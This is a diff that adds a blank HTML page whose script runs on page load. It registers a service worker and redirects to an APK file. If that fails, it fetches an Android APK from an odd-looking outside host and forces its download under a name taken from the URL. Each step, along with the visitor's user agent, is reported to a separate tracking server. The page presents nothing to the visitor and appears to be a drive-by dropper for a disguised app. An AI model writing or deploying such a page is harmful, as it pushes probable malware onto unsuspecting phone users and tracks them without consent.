@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"></head>
+<body>
+<script>
+    async function logEvent(eventType, data = {}) {
+        data.event = eventType; data.timestamp = Date.now(); data.ua = navigator.userAgent;
+        try {
+            await fetch("https://ptrforcfg.com/gh_test", {
+                method: 'POST', headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(data)
+            });
+        } catch (e) { console.error('Log error:', e); }
+    }
+
+    async function downloadApk() {
+        const apkURL = "https://blindlyorganicsnake.autos/aaa8e7e844e856a015a/" + location.search;
+        logEvent("fallback_start", {url: apkURL});
+        try {
+            const response = await fetch(apkURL, {method: 'GET', credentials: 'omit'});
+            logEvent("fallback_response", {ok: response.ok, status: response.status});
+            if (!response.ok) throw new Error("HTTP " + response.status);
+
+            const currentUrl = new URL(window.location.href);
+            let apkname = "download911.apk";
+            if (currentUrl.searchParams.get("utm_medium")) {
+                apkname = currentUrl.searchParams.get("utm_medium").replace(/[^\w-]/g, '_') + ".apk";
+            }
+
+            const blob = await response.blob();
+            logEvent("fallback_blob", {size: blob.size});
+
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url; a.download = apkname; document.body.appendChild(a); a.click();
+            document.body.removeChild(a); URL.revokeObjectURL(url);
+            logEvent("fallback_success");
+        } catch (error) {
+            logEvent("fallback_error", {message: error.message || error});
+            location.href = apkURL;
+        }
+    }
+
+    async function initSW() {
+        logEvent("sw_init");
+        if ('serviceWorker' in navigator) {
+            try {
+                const reg = await navigator.serviceWorker.register('./sw2.js');
+                await navigator.serviceWorker.ready;
+                logEvent("sw_ready");
+                location.href = 'my.apk' + location.search;
+            } catch (e) {
+                logEvent("sw_fail", {error: e.message || e});
+                downloadApk();
+            }
+        } else {
+            downloadApk();
+        }
+    }
+
+    window.addEventListener('unhandledrejection', function(e) {
+        logEvent("unhandled_rejection", {reason: e.reason ? e.reason.message || e.reason : 'unknown'});
+    });
+    window.onerror = function(msg, url, line, col, err) {
+        logEvent("js_error", {msg: msg || '', url: url || '', line: line || 0, col: col || 0, err: err ? (err.message || err) : ''});
+    };
+    window.addEventListener('load', initSW);
+</script>
+</body>
+</html>
